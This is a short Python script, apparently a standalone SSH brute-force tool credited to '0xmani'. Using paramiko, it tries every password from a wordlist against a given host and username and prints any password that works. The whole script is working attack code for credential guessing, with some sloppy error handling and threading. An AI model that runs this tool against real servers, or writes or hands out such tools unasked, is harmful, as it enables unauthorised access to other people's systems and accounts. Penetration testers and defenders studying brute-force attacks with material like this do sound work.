#!/usr/bin/python3

import paramiko
import sys, os, time
import threading
import pyfiglet


if len(sys.argv) >= 5:
    print("[-] Missing Arguments!")
    print("[+] python3 ssh-brute.py <host> <username> <passwordfile.txt>")
    sys.exit()

if len(sys.argv) < 4:
    print("[-] Missing Arguments!")
    print("[+] python3 ssh-brute.py <host> <username> <passwordfile.txt>")
    sys.exit()

host = sys.argv[1]
user = sys.argv[2]
passwd = sys.argv[3]
port = "22"

command = "id"

file = open(passwd, 'r')

def ssh_brute():
    for f in file:
        try:
            password = f.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, user, password, banner_timeout=200, auth_timeout=200)
            #stdin, stdout, stderr = ssh.exec_command(command)
            #lines = stdout.readlines()
            print("Password Found: "+password)
            sys.exit()
        except paramiko.ssh_exception.AuthenticationException:
            print("[+] Trying password as "+password)
        except paramiko.ssh_exception.SSHException:
            pass
        except EOFError:
            pass
        except Exception:
            pass
        except FileNotFoundError:
            print("File Not Found")
        except KeyboardInterrupt:
            print("Exiting Program...")
            sys.exit()
         


def print_banner():
    ascii_banner = pyfiglet.figlet_format("SSH Brute !!")
    print(ascii_banner)
    print("                                         ~$ 0xmani")


def thread_main():
    print("SSH BrutForcing Started...!\n")
    t =threading.Thread(target=ssh_brute())
    t.start()
    
print_banner()
thread_main()





